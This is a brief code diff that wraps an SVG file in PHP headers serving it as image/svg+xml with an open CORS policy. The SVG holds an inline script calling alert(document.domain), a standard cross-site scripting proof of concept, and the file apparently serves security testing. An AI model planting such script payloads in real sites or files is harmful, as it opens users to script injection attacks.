@@ -1,4 +1,7 @@
-
+<?php
+header('Content-Type: image/svg+xml');
+header('Access-Control-Allow-Origin: *');
+?>
 <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert(document.domain)</script>
 </svg>
